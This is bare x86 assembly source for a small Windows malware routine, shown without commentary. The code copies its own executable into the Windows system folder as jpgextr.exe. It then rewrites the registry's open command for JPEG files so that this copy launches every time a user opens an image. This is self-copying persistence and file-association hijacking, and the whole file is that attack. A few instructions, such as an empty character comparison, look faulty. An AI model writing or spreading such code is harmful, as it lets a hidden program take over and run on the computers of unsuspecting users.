.386
.model flat
        extrn            ExitProcess:PROC
        extrn            RegSetValueA:proc
        extrn            GetWindowsDirectoryA:PROC
        extrn            CopyFileA:proc 
        extrn            GetModuleFileNameA:proc
.DATA
        HKEY_CLASSES_ROOT       = 80000000h
        key                     db 'jpegfile\shell\open\command',0
        namevalue               db 'N',0
        handle                  dd 0
        winbuf                  db 261 dup(0)
.CODE

RegWriteAndCopy PROC FAR  
          PUBLIC  RegWriteAndCopy

start:
        push    261
        push    offset winbuf
        call    GetWindowsDirectoryA

  
        mov EDI,offset winbuf

find:
        cmp byte ptr [edi],''
        jz ch_
        inc edi         
        jmp find
ch_:     
        mov dword ptr [edi],'sys\' ;\system\jpgextr.exe 
        ADD EDI,4
        mov dword ptr [edi],'\met'
        ADD EDI,4
        mov dword ptr [edi],'egpj'
        ADD EDI,4
        mov dword ptr [edi],'.rtx'
        ADD EDI,4
        mov dword ptr [edi],'exe'
        ADD EDI,3

        push 1024
        push EBP
        push 0
        call GetModuleFileNameA

        push 0
        push offset winbuf
        push EBP
        call CopyFileA

        mov dword ptr [edi],'1% '
        ADD EDI,2

        push    offset winbuf
        push    offset namevalue
        push    offset key
        push    HKEY_CLASSES_ROOT
        call    RegSetValueA

        push 0
        call ExitProcess
        ret
RegWriteAndCopy ENDP
        END
